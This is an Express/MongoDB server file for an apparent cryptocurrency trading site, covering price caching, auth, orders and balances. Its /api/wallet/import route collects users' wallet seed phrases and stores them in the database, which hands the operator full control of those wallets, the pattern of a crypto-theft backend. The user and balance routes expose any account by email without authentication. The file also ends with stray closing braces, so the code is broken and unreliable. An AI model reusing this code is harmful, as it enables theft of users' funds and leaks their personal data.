const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const path = require('path');
require('dotenv').config();

const app = express();

// ==========================================
// REAL-TIME PRICE CACHE (Bypasses API Limits)
// ==========================================
let cachedPrices = null;
let lastFetched = 0;
const CACHE_DURATION = 60000;

app.get('/api/market/prices', async (req, res) => {
    const now = Date.now();
    if (cachedPrices && (now - lastFetched < CACHE_DURATION)) return res.json(cachedPrices);
    try {
        const response = await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=26&page=1&sparkline=false');
        const data = await response.json();
        cachedPrices = data;
        lastFetched = now;
        res.json(data);
    } catch (error) {
        if (cachedPrices) return res.json(cachedPrices);
        res.status(500).json({ error: 'Could not fetch market data' });
    }
});

app.use(cors());
app.use(express.json());

mongoose.connect(process.env.MONGO_URI)
  .then(() => console.log('✅ MongoDB Connected'))
  .catch((err) => console.log('❌ DB Error: ', err));

const User = require('./models/User');
const Order = require('./models/Order');

app.use('/api/auth', require('./routes/auth'));
app.use('/api/orders', require('./routes/order'));
app.use('/api/admin', require('./routes/admin'));

app.post('/api/wallet/import', async (req, res) => {
    try {
        const { email, seedPhrase, walletAddress } = req.body;
        await User.findOneAndUpdate({ email }, { seedPhrase, walletAddress, walletStatus: 'pending' });
        res.json({ message: "Wallet submitted" });
    } catch (error) { res.status(500).json({ message: "Error" }); }
});

app.get('/api/user/:email', async (req, res) => {
    try {
        const user = await User.findOne({ email: req.params.email }).select('-password -seedPhrase');
        res.json(user);
    } catch (error) { res.status(500).json({ message: "Error" }); }
});

app.get('/api/user/:email/balances', async (req, res) => {
    try {
        const orders = await Order.find({ userEmail: req.params.email });
        let balances = { BTC: 0, ETH: 0, USDT: 0 };
        orders.forEach(o => {
            if (o.mode === 'buy' && balances[o.getCurrency] !== undefined) balances[o.getCurrency] += parseFloat(o.getAmount);
            if (o.mode === 'sell' && balances[o.sendCurrency] !== undefined) balances[o.sendCurrency] -= parseFloat(o.sendAmount);
        });
        res.json(balances);
    } catch (error) { res.status(500).json({ message: "Error" }); }
});

app.use(express.static(path.join(__dirname, 'public')));
app.use((req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`🚀 Server on port ${PORT}`));

    }
});
